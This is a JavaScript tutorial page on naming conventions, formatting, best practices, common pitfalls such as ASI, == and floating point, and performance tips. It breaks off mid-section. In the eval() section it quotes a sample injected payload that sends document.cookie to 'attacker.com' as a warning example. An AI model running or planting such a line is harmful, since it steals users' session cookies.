---
title: "JavaScript Conventions, Best Practices, Common Mistakes & Performance"
nav_order: 24
---

## Table of Contents
1. [JavaScript Code Conventions](#1-javascript-code-conventions)
2. [JavaScript Best Practices](#2-javascript-best-practices)
3. [Common JavaScript Mistakes](#3-common-javascript-mistakes)
4. [JavaScript Performance](#4-javascript-performance)
5. [Phase 2 — Applied Exercises](#phase-2--applied-exercises)
6. [Phase 3 — Project Simulation](#phase-3--project-simulation)
7. [Completion Checklist](#completion-checklist)

---

# PHASE 1 — CONCEPTUAL UNDERSTANDING

## 1. JavaScript Code Conventions

### 1.1 What Are Code Conventions?

Imagine five builders constructing the same house — but each one uses a different measurement unit (one uses inches, one uses centimetres, one uses feet). The walls won't line up. The roof won't fit. Chaos.

**Code conventions** are the agreed-upon rules for how code should be written and formatted. They don't affect *whether* your code runs — they affect whether other developers (and your future self) can *read and understand* it.

**Why conventions matter in real life:**
- A junior developer joins your team. They need to understand 10,000 lines of code. If it's consistent, they can do it in days. If it's chaos, it takes months.
- Code reviews (where teammates check each other's code) are faster when everyone follows the same style
- Bugs hide in messy, inconsistent code — clean code exposes them

> 💡 **Analogy:** Conventions are like traffic rules. They don't make you a faster driver — they make the *road* work for everyone.

---

### 1.2 Naming Conventions

The most visible convention in any codebase is how things are named. JavaScript has clear community standards.

#### camelCase for Variables and Functions

**camelCase** means: first word is all lowercase, every subsequent word starts with a capital letter. No spaces, no underscores.

```javascript
// ✅ Correct — camelCase
let firstName = "Tunde";
let totalPrice = 15000;
let isUserLoggedIn = true;

function calculateDiscount(price, rate) {
  return price * rate;
}

// ❌ Incorrect — various bad styles
let FirstName = "Tunde";      // Looks like a class
let total_price = 15000;      // Underscore style (Python, not JS convention)
let TOTALPRICE = 15000;       // Looks like a constant
let totalprice = 15000;       // Hard to read — where does "total" end?
```

**Why camelCase?** JavaScript itself uses it everywhere — `getElementById`, `addEventListener`, `querySelector`. Matching the language's own style makes your code feel native.

---

#### PascalCase for Classes and Constructors

**PascalCase** (also called UpperCamelCase) means *every* word starts with a capital. This is used for constructors and class names only.

```javascript
// ✅ Correct — PascalCase for classes
class BankAccount {
  constructor(owner, balance) {
    this.owner = owner;
    this.balance = balance;
  }
}

class ShoppingCart {
  constructor() {
    this.items = [];
  }
}

// ✅ camelCase for instances of those classes
let myAccount = new BankAccount("Tunde", 50000);
let cart = new ShoppingCart();
```

The visual difference (`BankAccount` vs `bankAccount`) immediately tells any reader: *this is a class, not a variable.*

---

#### UPPER_SNAKE_CASE for Constants

When a value will **never change** throughout your program, name it in all capitals with underscores between words. This is a signal to all readers: *do not modify this.*

```javascript
// ✅ Constants — universal truths in your program
const MAX_RETRY_ATTEMPTS = 3;
const TAX_RATE = 0.075;
const API_BASE_URL = "https://api.myapp.com/v1";
const SECONDS_PER_DAY = 86400;

// Used like this:
let finalPrice = subtotal * (1 + TAX_RATE);

// ❌ Avoid magic numbers scattered in code
let finalPrice2 = subtotal * 1.075; // What is 1.075? Why?
```

**"Magic numbers"** (unexplained raw values like `1.075` or `86400`) are a common source of confusion and bugs. Named constants eliminate the mystery.

---

#### Naming Rules Summary

| What You're Naming | Convention | Example |
|-------------------|------------|---------|
| Variable | camelCase | `userAge`, `totalCost` |
| Function | camelCase | `getUser()`, `formatDate()` |
| Class / Constructor | PascalCase | `UserAccount`, `PaymentProcessor` |
| Constant | UPPER_SNAKE_CASE | `MAX_ITEMS`, `BASE_URL` |
| Boolean | Prefix with `is`, `has`, `can` | `isActive`, `hasPermission` |
| Private (convention) | Prefix with `_` | `_internalCounter` |

---

### 1.3 Indentation and Spacing

**Indentation** is the spaces at the start of lines inside blocks. The universal JavaScript standard is **2 spaces** (some teams use 4 — pick one and be consistent).

**Never use tabs mixed with spaces.** This causes alignment chaos across different editors.

```javascript
// ✅ Correct — 2-space indentation
function processOrder(order) {
  if (order.isPaid) {
    for (let item of order.items) {
      console.log("Shipping:", item.name);
    }
  } else {
    console.log("Payment pending");
  }
}

// ❌ Incorrect — mixed/missing indentation
function processOrder(order) {
if (order.isPaid) {
for (let item of order.items) {
console.log("Shipping:", item.name);
}
}
}
```

The first version makes the nesting structure visually obvious. The second version hides it.

---

### 1.4 Spaces Around Operators

Always put spaces around operators (`=`, `+`, `-`, `*`, `/`, `===`, etc.) and after commas. This is universally agreed upon and dramatically improves readability.

```javascript
// ✅ Correct — spaces around operators
let total = price + tax;
let average = (a + b + c) / 3;
let isEligible = age >= 18 && hasID === true;

function greet(name, title) {
  return title + " " + name;
}

// ❌ Incorrect — cramped, hard to parse
let total=price+tax;
let average=(a+b+c)/3;
function greet(name,title){return title+" "+name;}
```

> 💡 **Thinking Question:** Which version would you rather read at 11pm during an emergency fix? Conventions exist to help you in exactly those moments.

---

### 1.5 Statement Rules and Semicolons

Every executable statement should end with a **semicolon**. JavaScript has **Automatic Semicolon Insertion (ASI)** that adds them for you, but ASI has edge cases that cause surprising bugs.

```javascript
// ✅ Explicit semicolons — safe
let x = 5;
let y = 10;
let z = x + y;
console.log(z); // 15

// ⚠️ Relying on ASI — usually fine, but can bite you:
let a = 5
let b = 10
let c = a + b
console.log(c) // Works here, but...

// 🐛 ASI failure case:
let value = 5
[1, 2, 3].forEach(n => console.log(n))
// JavaScript reads this as: let value = 5[1,2,3].forEach(...)
// TypeError: Cannot read properties of undefined
```

The last example shows how omitting a semicolon causes JavaScript to merge two statements it shouldn't.

---

### 1.6 Code Blocks and Brace Style

In JavaScript, the opening brace `{` goes on the **same line** as the statement — this is called **K&R style** (Kernighan & Ritchie) and is the JavaScript standard.

```javascript
// ✅ Correct — opening brace on same line
function greetUser(name) {
  if (name) {
    return "Hello, " + name;
  } else {
    return "Hello, stranger";
  }
}

// ❌ Incorrect — Allman style (brace on next line)
// This actually causes a hidden bug in JavaScript!
function getObject()
{               // ← Opening brace on new line
  return
  {             // ← ASI inserts semicolon after `return`
    value: 42   // This object is NEVER returned!
  };
}

console.log(getObject()); // undefined — not {value: 42}
```

The second example is a real, documented JavaScript pitfall. Because of ASI, `return` on its own line becomes `return;` — the object literal below it is unreachable.

---

### 1.7 Line Length

Keep lines under **80 characters** wide. This is a universal convention across most programming languages. Long lines require horizontal scrolling and are hard to read in split-screen editors or code reviews.

```javascript
// ✅ Correct — broken across readable lines
let userSummary = "Name: " + user.firstName + " " + user.lastName
               + " | Email: " + user.email
               + " | Role: " + user.role;

// Or using template literals (preferred modern syntax):
let userSummary2 = `Name: ${user.firstName} ${user.lastName} | Email: ${user.email} | Role: ${user.role}`;

// ❌ Avoid — one very long line
let userSummary3 = "Name: " + user.firstName + " " + user.lastName + " | Email: " + user.email + " | Role: " + user.role + " | Status: " + user.status;
```

---

### 1.8 Comments

Comments should explain *why* something is done, not *what* — the code itself should be clear enough to show what. Reserve comments for non-obvious decisions.

```javascript
// ✅ Good comment — explains WHY
// We multiply by 1.075 instead of 0.075 to get the total-inclusive figure
// because the payment gateway requires full amounts, not just the tax portion
let taxInclusivePrice = basePrice * 1.075;

// ❌ Useless comment — explains what the code already shows
let x = x + 1; // Add 1 to x

// ✅ Good — JSDoc style for functions (used by editors for autocomplete)
/**
 * Calculates the discounted price.
 * @param {number} price - Original price in Naira
 * @param {number} rate  - Discount rate between 0 and 1
 * @returns {number} Final price after discount
 */
function applyDiscount(price, rate) {
  return price * (1 - rate);
}
```

---

### 1.9 Object and Array Formatting

Objects and arrays with multiple properties should be formatted one-property-per-line for readability.

```javascript
// ✅ Multi-line object — easy to read, easy to add/remove properties
let user = {
  id: 1,
  name: "Babatunde",
  email: "tunde@example.com",
  role: "admin",
  isActive: true
};

// ✅ Short arrays — single line is fine
let colours = ["red", "green", "blue"];

// ✅ Complex arrays — multi-line
let products = [
  { id: 1, name: "Laptop",   price: 450000 },
  { id: 2, name: "Mouse",    price: 8000   },
  { id: 3, name: "Keyboard", price: 12000  }
];

// ❌ Crammed object — hard to scan
let user2 = {id:1,name:"Tunde",email:"t@e.com",role:"admin",isActive:true};
```

---

### 1.10 General Conventions Quick-Reference

| Convention | Rule |
|------------|------|
| Variable names | camelCase |
| Class names | PascalCase |
| Constants | UPPER_SNAKE_CASE |
| Indentation | 2 spaces (no tabs) |
| Semicolons | Always use them |
| Brace placement | Same line as statement |
| Line length | 80 chars max |
| Spaces | Around operators, after commas |
| Quotes | Single `'` or double `"` — pick one and stick to it |
| Trailing commas | Allowed after last item in multi-line objects/arrays |

---

## 2. JavaScript Best Practices

### 2.1 What Are Best Practices?

Conventions tell you *how code should look*. Best practices tell you *how code should behave*. Best practices are lessons learned from thousands of developers making the same mistakes over and over — they're shortcuts to avoiding future pain.

---

### 2.2 Always Declare Variables — Avoid Global Leakage

If you assign a value to a variable without declaring it with `let`, `const`, or `var`, JavaScript silently creates a **global variable**. This is one of the most dangerous habits in JavaScript.

```javascript
// ❌ Accidental global variable
function calculateTotal(price, qty) {
  total = price * qty;  // No let/const/var — total is now GLOBAL
  return total;
}

calculateTotal(100, 5);
console.log(total); // 500 — accessible from ANYWHERE in your program!
```

**Why is this dangerous?**

```javascript
// In a completely different part of your code:
function resetCart() {
  total = 0; // This accidentally wipes the global total!
}

calculateTotal(100, 5);
resetCart();
console.log(total); // 0 — your calculation was silently destroyed
```

```javascript
// ✅ Always declare with let or const
function calculateTotal(price, qty) {
  let total = price * qty;  // Scoped to this function only
  return total;
}

// total is not accessible outside — safe!
```

---

### 2.3 Always Declare Variables at the Top of Their Scope

Declare all variables at the **top of the function** (or block). This prevents the confusion of variables appearing to exist before they're declared (hoisting with `var`) and makes the function's "ingredients" immediately visible.

```javascript
// ✅ Declare at top — all variables visible upfront
function processPayment(order) {
  let subtotal;
  let taxAmount;
  let discount;
  let finalTotal;
  let confirmationCode;

  subtotal = order.items.reduce((sum, item) => sum + item.price, 0);
  taxAmount = subtotal * 0.075;
  discount = order.hasPromoCode ? subtotal * 0.1 : 0;
  finalTotal = subtotal + taxAmount - discount;
  confirmationCode = "ORD-" + Date.now();

  return { finalTotal, confirmationCode };
}
```

---

### 2.4 Initialise Variables When You Declare Them

Give variables a default value immediately. This prevents bugs from `undefined` values slipping through.

```javascript
// ✅ Initialised at declaration
let count = 0;
let userName = "";
let isLoaded = false;
let items = [];
let config = {};

// ❌ Declared but not initialised — risky
let count;         // undefined
let userName;      // undefined
let items;         // undefined

// Later:
items.push("apple"); // TypeError: Cannot read properties of undefined (reading 'push')
```

---

### 2.5 Never Declare Numbers, Strings, or Booleans as Objects

JavaScript allows you to create "object" versions of primitives. **Never do this.** It creates subtle, hard-to-find bugs.

```javascript
// ❌ Object wrappers — dangerous
let name = new String("Tunde");
let age  = new Number(25);
let flag = new Boolean(false);

// The comparison trap:
let a = new Boolean(false);
if (a) {
  console.log("This runs!"); // ← It DOES run, because `a` is an object, and objects are truthy
}
// Expected intuition: "false" should be falsy. But `new Boolean(false)` is an OBJECT.
// Objects are ALWAYS truthy, regardless of their value.
```

```javascript
// ✅ Use primitive literals always
let name = "Tunde";
let age  = 25;
let flag = false;

if (!flag) {
  console.log("This runs correctly!"); // ✅
}
```

---

### 2.6 Use `===` Instead of `==`

`==` is the **loose equality** operator — it converts types before comparing. `===` is the **strict equality** operator — it checks both value AND type. Always use `===`.

```javascript
// The surprises of ==
console.log(0 == false);    // true  ← 0 and false are "loosely equal"
console.log("" == false);   // true  ← empty string and false too
console.log(0 == "");       // true  ← 0 and empty string!
console.log(null == undefined); // true ← null and undefined match loosely
console.log("5" == 5);      // true  ← string "5" equals number 5

// ✅ === is predictable — same type AND same value required
console.log(0 === false);   // false ← different types
console.log("5" === 5);     // false ← different types
console.log(5 === 5);       // true  ← same type, same value
```

**Real-world consequence:**

```javascript
// User inputs are always strings from HTML forms
let userInput = "5"; // From an <input> field

// ❌ Bug with ==
if (userInput == 5) {
  grantAccess(); // Runs when it shouldn't!
}

// ✅ Safe with ===
if (Number(userInput) === 5) {
  grantAccess(); // Only runs after explicit type conversion
}
```

---

### 2.7 Use Parameter Defaults

When a function argument is not provided, it becomes `undefined`. Using default parameter values prevents downstream `undefined` bugs.

```javascript
// ❌ No default — crashes if argument missing
function greet(name) {
  return "Hello, " + name.toUpperCase();
}
greet(); // TypeError: Cannot read properties of undefined (reading 'toUpperCase')

// ✅ With default — safe
function greet(name = "Guest") {
  return "Hello, " + name.toUpperCase();
}
greet();           // "Hello, GUEST"
greet("Tunde");    // "Hello, TUNDE"
```

---

### 2.8 End Switches with `default`

In a `switch` statement, always include a `default` case. It handles any value that doesn't match any `case`.

```javascript
// ✅ Always include default
function getDayName(dayNumber) {
  switch (dayNumber) {
    case 1:  return "Monday";
    case 2:  return "Tuesday";
    case 3:  return "Wednesday";
    case 4:  return "Thursday";
    case 5:  return "Friday";
    case 6:  return "Saturday";
    case 7:  return "Sunday";
    default: return "Invalid day number"; // ← Safety net
  }
}

console.log(getDayName(3));   // Wednesday
console.log(getDayName(9));   // Invalid day number
console.log(getDayName(-1));  // Invalid day number
```

---

### 2.9 Avoid `eval()`

`eval()` takes a string and executes it as JavaScript. It is:
- **Dangerous** — allows code injection attacks
- **Slow** — cannot be optimised by the JavaScript engine
- **Unnecessary** — every legitimate use has a safer alternative

```javascript
// ❌ Never do this
let code = "alert('You have been hacked!')";
eval(code); // Executes whatever string is passed — catastrophically risky

// If user input reaches eval():
let userFormula = getUserInput(); // Could be "fetch('attacker.com?data='+document.cookie)"
eval(userFormula); // ← Sends the user's cookies to an attacker

// ✅ Instead — use actual code
// Replace: eval("x = " + input) with just: x = Number(input)
```

---

### 2.10 Avoid Using `with`

The `with` statement changes scope in unpredictable ways and is banned in **strict mode**. Never use it.

```javascript
// ❌ with — confusing scope
with (document) {
  let el = getElementById("myDiv"); // Is this document.getElementById or window.getElementById?
}

// ✅ Be explicit
let el = document.getElementById("myDiv");
```

---

### 2.11 Use `"use strict"` Mode

Adding `"use strict"` at the top of a file or function turns on strict mode, which catches many common mistakes as errors instead of silently ignoring them.

```javascript
"use strict";

// Now these will throw errors instead of silently misbehaving:

x = 10;        // ReferenceError — undeclared variable
delete x;      // SyntaxError — can't delete a variable
let obj = {};
Object.freeze(obj);
obj.name = "test"; // TypeError — writing to frozen object
```

**What strict mode prevents:**
- Accidental global variables
- Deleting variables, functions, or function arguments
- Using reserved future keywords as variable names
- Duplicate parameter names in functions

> 💡 **Modern note:** ES6 modules (`import`/`export`) are automatically in strict mode. Class bodies are also always in strict mode.

---

### 2.12 Reduce Global Variables

Every variable declared at the global scope is shared by every script on the page. A naming collision with a third-party library can break your code silently.

```javascript
// ❌ Multiple global variables — collision risk
var user = { name: "Tunde" };
var total = 0;
var isLoaded = false;

// ✅ Encapsulate in a namespace object
const MyApp = {
  user: { name: "Tunde" },
  total: 0,
  isLoaded: false,
  
  init() {
    console.log("App started for:", this.user.name);
  }
};

MyApp.init();
// Expected Output: App started for: Tunde
```

The entire application's state now lives under one global variable (`MyApp`) rather than dozens.

---

## 3. Common JavaScript Mistakes

### 3.1 Why Study Mistakes?

Every developer makes the same class of mistakes when learning JavaScript. By studying them in advance, you can recognise them in your own code before they become bugs in production. These are not rare edge cases — they are the daily reality of JavaScript development.

---

### 3.2 Accidentally Using Assignment Instead of Comparison

Using `=` (assignment) instead of `==` or `===` (comparison) inside an `if` condition is a classic bug. In JavaScript, unlike some languages, this does not cause an error — it silently works differently than intended.

```javascript
let score = 85;

// ❌ Assignment inside if — always true!
if (score = 100) {       // score is now SET to 100, not compared
  console.log("Perfect score!"); // This ALWAYS runs
}
console.log("Score is now:", score); // Score is now: 100 — your value was overwritten!

// ✅ Comparison
if (score === 100) {
  console.log("Perfect score!");
}
```

> 💡 **Pro tip:** Some developers write comparisons "backwards" to prevent this: `if (100 === score)`. If you accidentally type `if (100 = score)`, JavaScript throws an error — because you can't assign to a literal. This is called a "Yoda condition."

---

### 3.3 Expecting Loose Comparison to Work Intuitively

We covered `==` vs `===` in best practices, but here are more surprising cases:

```javascript
// The switch statement uses ===
let input = "1"; // String from a form

switch (input) {
  case 1:         // Number 1
    console.log("One");
    break;
  default:
    console.log("Not matched"); // ← This runs! "1" !== 1
}

// Fix:
switch (Number(input)) {  // Convert before switching
  case 1:
    console.log("One");   // Now matches correctly
    break;
}
```

---

### 3.4 Confusing Addition and Concatenation

The `+` operator does both **arithmetic addition** (for numbers) and **string concatenation** (for strings). Which one it performs depends on the types involved — and JavaScript is eager to convert numbers to strings.

```javascript
// When both are numbers: addition
let a = 10 + 5;
console.log(a); // 15

// When either is a string: concatenation
let b = "10" + 5;
console.log(b); // "105" ← Not 15!

let c = 5 + "10";
console.log(c); // "510" ← Not 15!

// Chaining with mixed types gets confusing:
let d = 10 + 20 + "5";
console.log(d); // "305" ← 10+20=30, then "30"+"5"="305"

let e = "5" + 10 + 20;
console.log(e); // "51020" ← "5"+10="510", then "510"+20="51020"
```

**The rule:** `+` is evaluated **left to right**. As soon as it hits a string, everything after concatenates.

**Fix — always convert strings to numbers explicitly:**

```javascript
let quantity = "3";
let price    = "1500";

// ❌ Concatenation instead of addition
let total = quantity + price; // "31500" — wrong!

// ✅ Explicit conversion
let total2 = Number(quantity) + Number(price); // 4500
let total3 = parseInt(quantity) + parseInt(price); // 4500
let total4 = +quantity + +price; // 4500 — unary + operator also converts
```

---

### 3.5 Misunderstanding Floating-Point Arithmetic

JavaScript uses 64-bit floating-point numbers (IEEE 754). This means some decimal calculations produce unexpected results.

```javascript
let a = 0.1 + 0.2;
console.log(a);           // 0.30000000000000004 ← not 0.3!
console.log(a === 0.3);   // false

// More examples:
console.log(0.1 + 0.7);  // 0.7999999999999999
console.log(1.0 - 0.9);  // 0.09999999999999998
```

**Why this happens:** Computers store numbers in binary. Just as `1/3` cannot be expressed exactly in decimal (0.333...), `0.1` cannot be expressed exactly in binary — so it's stored as an approximation.

**Solutions:**

```javascript
// Solution 1: Round to fixed decimals
let result = 0.1 + 0.2;
console.log(result.toFixed(2));           // "0.30" (string)
console.log(Number(result.toFixed(2)));   // 0.3 (number)

// Solution 2: Work in whole numbers (cents instead of naira/dollars)
let price1 = 10; // 10 kobo (not 0.10 naira)
let price2 = 20; // 20 kobo
let total = (price1 + price2) / 100;
console.log(total); // 0.3 — exact!

// Solution 3: Compare with tolerance
function areEqual(a, b, tolerance = 0.00001) {
  return Math.abs(a - b) < tolerance;
}
console.log(areEqual(0.1 + 0.2, 0.3)); // true
```

> 💡 **Real-world note:** Payment systems (banks, fintech apps) always work in the smallest denomination (kobo, cents, pence) to avoid floating-point errors. Never store money as `15.50` — store it as `1550` cents.

---

### 3.6 Breaking a JavaScript String Incorrectly

JavaScript strings must be complete on one line. If you try to break a long string across lines naively, you'll get a SyntaxError.

```javascript
// ❌ This causes a SyntaxError
let message = "Welcome to our platform.
Please read the terms."; // SyntaxError: Unterminated string literal

// ✅ Option 1: Concatenation
let message1 = "Welcome to our platform. " +
               "Please read the terms.";

// ✅ Option 2: Template literal (backtick) — supports real line breaks
let message2 = `Welcome to our platform.
Please read the terms.`;

// ✅ Option 3: Escape the newline (not recommended — fragile)
let message3 = "Welcome to our platform.\
Please read the terms."; // The backslash continues the string
```

---

### 3.7 Misplacing the Return Statement (the Semicolon Insertion Trap)

As shown in the conventions section, JavaScript's Automatic Semicolon Insertion (ASI) inserts a semicolon after `return` if nothing follows it on the same line.

```javascript
// ❌ Bug — ASI inserts semicolon after return
function getUserInfo() {
  return          // ← JavaScript adds ; here!
  {               // ← This block is unreachable code
    name: "Tunde",
    age: 25
  };
}

console.log(getUserInfo()); // undefined — not the object!

// ✅ Fix — opening brace on same line as return
function getUserInfo() {
  return {        // ← No line break — ASI cannot insert semicolon here
    name: "Tunde",
    age: 25
  };
}

console.log(getUserInfo()); // { name: "Tunde", age: 25 }
```

---

### 3.8 Accessing Arrays with Named Indexes

In JavaScript, arrays are **numerically indexed** only. If you use a string (named) index, you're accidentally creating an object property — not an array element. This causes the `length` property to give wrong results.

```javascript
// ❌ Named indexes on an array
let person = [];
person["name"] = "Tunde";   // Creates an object property
person["age"]  = 25;         // Creates another object property

console.log(person.length);  // 0 ← Not 2! Named properties don't count
console.log(person[0]);      // undefined

// ✅ For named properties, use an object
let person2 = {
  name: "Tunde",
  age: 25
};
console.log(Object.keys(person2).length); // 2

// ✅ For numbered items, use a real array
let scores = [85, 92, 78];
console.log(scores.length); // 3
console.log(scores[0]);     // 85
```

---

### 3.9 Confusing `undefined` and `null`

Both `undefined` and `null` represent "no value" — but they mean different things and behave differently.

| | `undefined` | `null` |
|-|-------------|--------|
| **Meaning** | Variable declared but never assigned | Intentionally empty — set by the developer |
| **Type** | `"undefined"` | `"object"` ← (a known JS quirk) |
| **Origin** | JavaScript engine | Developer code |
| **When you see it** | Missing argument, undeclared property | Deliberate "empty" value |

```javascript
let x;
console.log(x);            // undefined — declared, no value assigned

let y = null;
console.log(y);            // null — explicitly set to "nothing"

console.log(typeof x);    // "undefined"
console.log(typeof y);    // "object" ← historical bug in JavaScript

// Comparing them:
console.log(x == y);     // true  — loosely equal
console.log(x === y);    // false — strictly NOT equal

// Practical use:
function findUser(id) {
  let user = database.find(u => u.id === id);
  return user || null;  // Return null (intentional empty) if not found
}

let result = findUser(999);
if (result === null) {
  console.log("User not found — this was expected");
}
```

---

### 3.10 Expecting `typeof null` to Return `"null"`

This is one of the most famous quirks in JavaScript — a known bug that cannot be fixed for backward-compatibility reasons.

```javascript
console.log(typeof null);      // "object" ← Not "null"!
console.log(typeof undefined); // "undefined"
console.log(typeof 42);        // "number"
console.log(typeof "hello");   // "string"
console.log(typeof true);      // "boolean"
console.log(typeof function(){}); // "function"
console.log(typeof {});        // "object"
console.log(typeof []);        // "object" ← Arrays are also "object"!

// How to correctly check for null:
let value = null;
console.log(value === null);    // true ← use this

// How to distinguish array from object:
let arr = [1, 2, 3];
console.log(Array.isArray(arr));         // true
console.log(Array.isArray({ a: 1 }));   // false
```

---

### 3.11 Using `new Array()` with a Single Number Argument

The `Array` constructor behaves differently depending on how many arguments you pass.

```javascript
// One argument: creates a sparse array of THAT LENGTH — not an array with that value
let arr1 = new Array(5);
console.log(arr1);        // [ <5 empty items> ]
console.log(arr1.length); // 5
console.log(arr1[0]);     // undefined

// Multiple arguments: creates an array with those VALUES
let arr2 = new Array(1, 2, 3);
console.log(arr2);        // [1, 2, 3]

// ✅ Always use array literals — no surprises
let arr3 = [5];       // [5] — an array with the value 5
let arr4 = [1, 2, 3]; // [1, 2, 3]

// If you need an array of a specific length filled with a value:
let fiveZeros = new Array(5).fill(0);
console.log(fiveZeros); // [0, 0, 0, 0, 0]
```

---

### 3.12 The Danger of `var` in Loops — Closure Trap

This is a classic JavaScript trap that affects code using `var` inside loops.

```javascript
// ❌ The var closure bug
for (var i = 0; i < 3; i++) {
  setTimeout(function() {
    console.log("var i:", i); // What does this print?
  }, 100);
}
// Expected (wrong intuition): 0, 1, 2
// Actual output: 3, 3, 3
// Why: var is function-scoped, not block-scoped.
// By the time the timeouts fire, the loop is done and i === 3.

// ✅ Fix with let — block-scoped, creates new binding each iteration
for (let j = 0; j < 3; j++) {
  setTimeout(function() {
    console.log("let j:", j); // 0, 1, 2 — correct!
  }, 100);
}
```

This is one of the reasons `let` and `const` were introduced in ES6 — to fix the confusing scoping behaviour of `var`.

---

## 4. JavaScript Performance

### 4.1 Why Performance Matters

**Performance** is about how fast your code runs and how efficiently it uses memory. A slow web application causes:
- Users leaving before a page loads (research shows 40% of users abandon a page that takes more than 3 seconds to load)
- Higher server costs (slow code runs longer, consuming more resources)
- Poor user experience (janky scrolling, unresponsive buttons)

As a developer, you won't need to manually optimise every line — but you need to avoid common patterns that make code unnecessarily slow.

---

### 4.2 Reduce DOM Access

The DOM (Document Object Model) is the browser's representation of your HTML page. Accessing it is **much slower** than accessing a plain JavaScript variable — the browser has to parse through its entire tree structure.

**Rule:** Never access the DOM inside a loop. Cache DOM references in variables.

```javascript
// ❌ Slow — DOM access on every iteration
for (let i = 0; i < 1000; i++) {
  document.getElementById("output").innerHTML += i + " ";
  // Reads from DOM, modifies DOM, triggers a re-render — 1000 times!
}

// ✅ Fast — access DOM once, use a string variable in the loop
let output = document.getElementById("output"); // One DOM access
let content = "";

for (let i = 0; i < 1000; i++) {
  content += i + " "; // String operation — extremely fast
}

output.innerHTML = content; // One DOM write at the end

// Performance difference: the slow version might take 300ms+
// The fast version takes < 1ms
```

**Micro-demo — timing the difference:**

```javascript
// Timing the slow approach
console.time("slow");
let el = document.getElementById("output");
for (let i = 0; i < 500; i++) {
  el.innerHTML += i;
}
console.timeEnd("slow"); // slow: 250ms (example)

// Timing the fast approach
console.time("fast");
let text = "";
for (let i = 0; i < 500; i++) {
  text += i;
}
document.getElementById("output").innerHTML = text;
console.timeEnd("fast"); // fast: 2ms (example)
```

---

### 4.3 Reduce DOM Size

The larger your HTML structure, the slower the browser is at searching and rendering it. Keep your DOM lean.

```javascript
// ❌ Creates a deeply nested, complex structure
// Searching for .product-name in 10,000 nodes is slow

// ✅ Keep DOM flat where possible
// Fewer nodes = faster querySelector, faster rendering, less memory

// Programmatic example: build HTML in a string, then insert once
function renderProductList(products) {
  let html = "<ul>";
  
  for (let product of products) {
    html += `<li class="product">
      <span class="name">${product.name}</span>
      <span class="price">₦${product.price.toLocaleString()}</span>
    </li>`;
  }
  
  html += "</ul>";
  
  // One DOM write — not one per product
  document.getElementById("product-list").innerHTML = html;
}
```

---

### 4.4 Avoid Unnecessary Variables

Creating a variable to hold the result of a simple expression before immediately using it wastes memory and makes code verbose.

```javascript
// ❌ Unnecessary intermediate variable
let result = document.getElementById("firstName").value;
console.log(result);

// ✅ Use directly when you won't reuse the value
console.log(document.getElementById("firstName").value);

// BUT — if you use the same value more than once:
// ✅ Then caching in a variable is CORRECT and GOOD
let firstName = document.getElementById("firstName").value;
validateName(firstName);
displayName(firstName);
logUser(firstName);
```

**The rule is:**  
- Used **once** → use directly  
- Used **multiple times** → cache in a variable

---

### 4.5 Delay JavaScript Loading with `defer` and `async`

When a browser encounters a `<script>` tag, it **pauses rendering** of the page to download and execute the script. For large scripts, this can make your page appear blank for seconds.

```html
<!-- ❌ Script blocks page rendering — user sees a blank page -->
<head>
  <script src="app.js"></script>
</head>

<!-- ✅ defer — downloads in parallel, executes AFTER HTML is parsed -->
<head>
  <script src="app.js" defer></script>
</head>

<!-- ✅ async — downloads in parallel, executes as soon as downloaded -->
<head>
  <script src="analytics.js" async></script>
</head>
```

| Attribute | Download | Executes When | Preserves Order |
|-----------|----------|---------------|-----------------|
| None | Blocks | Immediately | Yes |
| `defer` | Parallel | After HTML parsed | Yes |
| `async` | Parallel | As soon as downloaded | No |

**When to use which:**
- `defer` → Your main application scripts (need DOM to be ready)
- `async` → Independent scripts (analytics, ads, chat widgets) that don't depend on DOM or other scripts
- Neither → Critical scripts that must run immediately (rare)

---

### 4.6 Avoid `with` — It Destroys Performance

The `with` statement prevents the JavaScript engine from knowing at compile time which variables belong to which scope. This defeats an important optimisation strategy in all modern JavaScript engines.

```javascript
// ❌ with — the engine can't optimise this
with (document.getElementById("myForm")) {
  value = "default"; // Is this the element's .value? Or a global variable?
  style.color = "red"; // Ambiguous scope — engine must search at runtime
}

// ✅ Explicit — engine knows exactly what everything refers to
let form = document.getElementById("myForm");
form.value = "default";
form.style.color = "red";
```

---

### 4.7 Reduce the Number of Variables — Prefer Expressions Where Sensible

Fewer variables mean less memory allocation and less the garbage collector needs to clean up.

```javascript
// ❌ Unnecessary variable chain
let rawInput = getUserInput();
let trimmedInput = rawInput.trim();
let uppercasedInput = trimmedInput.toUpperCase();
let finalInput = uppercasedInput;

// ✅ Chain the operations — no temporary variables needed
let finalInput = getUserInput().trim().toUpperCase();

// ✅ Or with a single meaningful variable
let username = getUserInput().trim().toUpperCase();
```

---

### 4.8 Use Event Delegation Instead of Per-Element Listeners

If you have 100 list items and you add a `click` event listener to each one, you have **100 event listener objects in memory**. This is slow to set up and uses excessive memory.

**Event delegation:** Add ONE listener to the parent, and use the `event.target` to figure out which child was clicked.

```javascript
// ❌ 100 event listeners
let items = document.querySelectorAll(".product-item");
items.forEach(item => {
  item.addEventListener("click", function() {
    handleProductClick(this.dataset.productId);
  });
}); // Creates 100 separate function objects in memory

// ✅ 1 event listener (event delegation)
document.getElementById("product-list").addEventListener("click", function(event) {
  let clickedItem = event.target.closest(".product-item");
  if (clickedItem) {
    handleProductClick(clickedItem.dataset.productId);
  }
}); // One function object — handles ALL current and future items
```

**Bonus:** If new items are dynamically added to the list, they're automatically handled — no need to re-attach listeners.

---

### 4.9 Keep Heavy Logic Out of Loops

Any operation inside a loop runs **once per iteration**. A slow operation inside a tight loop becomes catastrophically slow.

```javascript
let data = [...Array(10000).keys()]; // Array of 10000 numbers

// ❌ Recalculates data.length on every iteration
for (let i = 0; i < data.length; i++) {
  process(data[i]);
}

// ✅ Cache the length before the loop
let len = data.length; // Read once
for (let i = 0; i < len; i++) {
  process(data[i]);
}

// ❌ DOM access inside a loop (covered earlier — repeated for emphasis)
for (let i = 0; i < len; i++) {
  document.querySelector(".counter").textContent = i; // DOM write 10000 times!
}

// ✅ Move DOM access outside
let counter = document.querySelector(".counter"); // Read once
for (let i = 0; i < len; i++) {
  // If we must update in the loop, we still need the cached reference
}
counter.textContent = len - 1; // Write once, at the end
```

---

### 4.10 Avoid `eval()` — Also a Performance Problem

In addition to the security concerns from Best Practices, `eval()` is also a **significant performance problem**:
- It forces the JavaScript engine to call the interpreter fresh on every call
- Compiled/optimised code paths cannot be used
- The engine cannot predict what variables will be in scope

No modern JavaScript code should ever use `eval()`.

---

### 4.11 Use Proper Data Structures

Choosing the right data structure dramatically affects performance for common operations.

```javascript
// Searching in an array: O(n) — slow for large datasets
let userList = ["alice", "bob", "carol", "david"];
let found = userList.includes("carol"); // Scans up to 4 items

